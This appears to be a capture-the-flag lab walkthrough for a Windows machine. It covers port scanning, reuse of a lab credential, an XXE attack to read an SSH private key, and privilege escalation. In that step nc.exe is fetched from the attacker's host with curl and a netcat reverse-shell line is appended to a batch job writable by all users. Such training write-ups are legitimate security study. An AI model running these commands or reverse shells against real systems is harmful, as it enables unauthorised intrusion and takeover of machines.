* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)

![alt text](./img/markup.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.49 -e tun0 --rate=1000  
![alt text](./img/markup01.PNG?raw=true)  

nmap -A 10.10.10.49 -p 22,80,443  
![alt text](./img/markup02.PNG?raw=true)  

dirsearch -u http://10.10.10.49 -w ~/wordlists/common.txt -t 100 --full-url  
![alt text](./img/markup03.PNG?raw=true)  

Using the credentials founded in the INCLUDED machine we can login to the webpage -> daniel:>SNDv*2wzLWf  
![alt text](./img/markup04.PNG?raw=true)  

## Exploit  
Let’s click on the ORDER item  
![alt text](./img/markup05.PNG?raw=true)  

Checking the source code of the page we found an user….  
![alt text](./img/markup06.PNG?raw=true)  

Let’s try to do some XSS in this form  
![alt text](./img/markup07.PNG?raw=true)  
  
![alt text](./img/markup08.PNG?raw=true)  

Hummmm loadXML? Maybe the application is vulnerable to XXE.  
To test this let's start burpsuite, capture the order request and send to repeater  
![alt text](./img/markup09.PNG?raw=true)  

Now we inject an XXE payload to test the XXE vuln  
![alt text](./img/markup10.PNG?raw=true)  

Send the request and check the response  
![alt text](./img/markup11.PNG?raw=true)  
  
SUCCESS!!!

Ok, with nmap we found that port 22 is open. Maybe there is some id_rsa file on the target. One target that we found is Daniel’s, so let’s start with him  
![alt text](./img/markup12.PNG?raw=true)  
  
Touche!

Now copy the id_rsa to a file in your machine  
![alt text](./img/markup13.PNG?raw=true)  
  
OBS.: Don’t forget to let one empty line in the end of the file because of the format of id_rsa key

Now we can connect to the target with ssh  
ssh daniel@10.10.10.49 -i id_rsa_daniel  
![alt text](./img/markup14.PNG?raw=true)  
  
HABEMUS SHELL \o/

Go to the desktop folder and get the flag  
![alt text](./img/markup15.PNG?raw=true)  

## Privesc  
Let’s check our privileges  
![alt text](./img/markup16.PNG?raw=true)  

Nothing REALLY isefull, let’s see what services are running  and the OS  
![alt text](./img/markup17.PNG?raw=true)  

Sad. So let’s do it old school. Mapping the system manually  
On the C:\ folder we found some interesting things  
![alt text](./img/markup18.PNG?raw=true)  

Here we have XAMPP and LOg-MANAGEMENT that can be interesting. Let’s start with LOG folder  
![alt text](./img/markup20.PNG?raw=true)  
  
Analysing the file we see that he need to be executed as Administrator.  

Now let’s check this file permissions:
icacls job.bat  
![alt text](./img/markup21.PNG?raw=true)  

Looks like all local users has control of the file (BUILDIN\Users). So we can edit it, this means that we can use it to privesc.

For this let’s upload a copy of nc to the machine. Start an web server (Example: sudo python3 -m http.server 80) in your machine and use the next commands on target machine:
curl http://YOUR_IP/nc.exe -o c:\users\daniel\desktop\nc-eldruin.exe
echo c:\users\daniel\desktop\nc-eldruin.exe -e cmd.exe YOUR_IP YOUR_PORT >> c:\Log-Management\job.bat
type c:\Log-Management\job.bat  
![alt text](./img/markup22.PNG?raw=true)  

Start an nc listener in your machine and wait receive asn reverse shell  
![alt text](./img/markup23.PNG?raw=true)  

## Discoveries  
Look’s like these files are not useful in the next machines, but is good to practice enumeration 

![alt text](./img/markup19.PNG?raw=true)  
  
![alt text](./img/markup24.PNG?raw=true)  
  
![alt text](./img/markup25.PNG?raw=true)  

